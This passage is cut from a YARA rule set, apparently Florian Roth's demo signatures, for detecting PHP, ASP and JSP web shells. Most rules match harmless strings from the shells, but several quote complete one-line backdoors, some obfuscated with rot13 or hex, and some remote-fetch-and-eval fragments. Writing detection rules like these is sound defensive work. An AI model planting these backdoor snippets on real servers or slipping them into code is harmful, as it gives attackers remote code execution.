      $s0 = "@$rto=$_POST['rto'];" fullword
      $s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
      $s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
   condition: 
      2 of them
}

rule Webshell_c99shell_v1_PHP_RID2FE0 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:15:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
      hash3 = "d089e7168373a0634e1ac18c0ee00085"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
   condition: 
      all of them
}

rule Webshell_multiple_php_webshells_2_RID3472 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I" 
      $s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma" 
      $s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
   condition: 
      all of them
}

rule Webshell_SpecialShell_99_php_php_a_RID343E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if ($total === FALSE) {$total = 0;}" fullword
      $s1 = "$free_percent = round(100/($total/$free),2);" fullword
      $s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
      $s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
   condition: 
      2 of them
}

rule Webshell_r577_php_spy_2_RID2FAE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
      hash3 = "817671e1bdc85e04cc3440bbd9288800"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
      $s2 = "'eng_text30'=>'Cat file'," fullword
      $s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
   condition: 
      1 of them
}

rule Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:42:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
      hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash3 = "f3ca29b7999643507081caab926e2e74"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
      $s1 = "$ret = posix_kill($pid,$sig);" fullword
      $s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
      $s3 = "$i = $nixpasswd;" fullword
   condition: 
      2 of them
}

rule Webshell_webshells_new_con2_RID31E9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file con2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:42:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e" 
      $s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_make2_RID3247 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file make2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:58:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8" 
   condition: 
      all of them
}

rule Webshell_webshells_new_php2_RID31F1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php $s=@$_GET[2];if(md5($s.$s)==" 
   condition: 
      all of them
}

rule Webshell_bypass_iisuser_p_RID316A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file bypass-iisuser-p.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject" 
   condition: 
      all of them
}

rule Webshell_webshells_new_pppp_RID3237 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file pppp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:55:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Mail: chinese@hackermail.com" fullword
      $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo " 
      $s6 = "Site: http://blog.weili.me" fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_jspyyy_RID332F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file jspyyy.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:37:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")" 
   condition: 
      all of them
}

rule Webshell_webshells_new_xxxx_RID3257 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:01:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php eval($_POST[1]);?>  " fullword
   condition: 
      all of them
}

rule Webshell_webshells_new_JJjsp3_RID328B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJjsp3.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S" 
   condition: 
      all of them
}

rule Webshell_webshells_new_radhat_RID32EB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file radhat.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:25:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "sod=Array(\"D\",\"7\",\"S" 
   condition: 
      all of them
}

rule Webshell_webshells_new_php6_RID31F5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "array_map(\"asx73ert\",(ar" 
      $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
      $s4 = "shell.php?qid=zxexp  " fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_xxx_RID31DF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file xxx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
   condition: 
      all of them
}

rule Webshell_GetPostpHp_RID2E94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file GetPostpHp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
   condition: 
      all of them
}

rule Webshell_webshells_new_php5_RID31F4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file php5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u" 
   condition: 
      all of them
}

rule Webshell_Expdoor_com_ASP_RID3068 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file Expdoor.com ASP.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 12:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "\">www.Expdoor.com</a>" fullword
      $s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max" 
      $s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
      $s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
      $s16 = "<TITLE>Expdoor.com ASP" fullword
   condition: 
      2 of them
}

rule Webshell_sig_404super_RID2F0F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file 404super.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 11:41:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
      $s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
      $s7 = "//http://require.duapp.com/session.php" fullword
      $s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
      $s12 = "//define('pass','123456');" fullword
      $s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_JSP_RID3164 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JSP.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i" 
      $s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app" 
      $s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest" 
   condition: 
      1 of them
}

rule Webshell_dev_core_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file dev_core.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 10:52:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
      $s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
      $s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874" 
      $s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))" 
      $s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C" 
      $s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_code_RID3212 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file code.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:49:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi" 
      $s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO" 
      $s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_" 
      $s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:" 
      $s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_PHP1_RID3190 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:27:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
      $s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
      $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
   condition: 
      1 of them
}

rule Webshell_webshells_new_JJJsp2_RID326A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file JJJsp2.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:04:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z" 
      $s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ" 
      $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()" 
      $s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase(" 
   condition: 
      1 of them
}

rule Webshell_webshells_new_PHP_RID315F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Web shells - generated from file PHP.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:19:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "echo \"<font color=blue>Error!</font>\";" fullword
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE" 
      $s5 = " - ExpDoor.com</title>" fullword
      $s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
      $s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
   condition: 
      1 of them
}

rule Webshell_PHP_sql_RID2D3D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file sql.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:23:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_" 
      $s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&" 
   condition: 
      all of them
}

rule Webshell_iMHaPFtp_2_RID2E10 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file iMHaPFtp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($" 
      $s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA" 
   condition: 
      1 of them
}

rule Webshell_phpshell_2_1_pwhash_RID3211 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file pwhash.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:49:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi" 
      $s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\"," 
   condition: 
      1 of them
}

rule Webshell_PHPRemoteView_RID2F95 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHPRemoteView.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'" 
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
   condition: 
      1 of them
}

rule Webshell_caidao_shell_guo_RID3128 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guo.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:10:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php ($www= $_POST['ice'])!" 
      $s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww" 
   condition: 
      1 of them
}

rule Webshell_PHP_redcod_RID2E5E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file redcod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:11:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
      $s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
   condition: 
      all of them
}

rule Webshell_remview_fix_RID2F4B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file remview_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u" 
      $s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n" 
   condition: 
      1 of them
}

rule Webshell_php_sh_server_RID301E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file server.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:26:11"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "eval(getenv('HTTP_CODE'));" fullword
   condition: 
      all of them
}

rule Webshell_PH_Vayv_PH_Vayv_RID303F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PH Vayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in" 
      $s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style" 
   condition: 
      1 of them
}

rule Webshell_caidao_shell_ice_RID310E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:06:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%eval request(\"ice\")%>" fullword
   condition: 
      all of them
}

rule Webshell_cihshell_fix_RID2F98 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cihshell_fix.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:03:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty" 
      $s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos" 
   condition: 
      1 of them
}

rule Webshell_asp_shell_RID2E61 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file shell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
      $s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
   condition: 
      all of them
}

rule Webshell_Private_i3lue_RID2FC2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Private-i3lue.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:10:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "case 15: $image .= \"\\21\\0\\" 
   condition: 
      all of them
}

rule Webshell_Mysql_interface_v1_0_RID3261 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Mysql interface v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return" 
   condition: 
      all of them
}

rule Webshell_phpshell_2_1_config_RID31FC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file config.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
   condition: 
      all of them
}

rule Webshell_asp_EFSO_2_RID2E07 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file EFSO_2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB" 
   condition: 
      all of them
}

rule Webshell_jsp_up_RID2D37 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
   condition: 
      all of them
}

rule Webshell_NetworkFileManagerPHP_A_RID3353 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file NetworkFileManagerPHP.php"
      author = "Florian Roth"
      reference = "-"
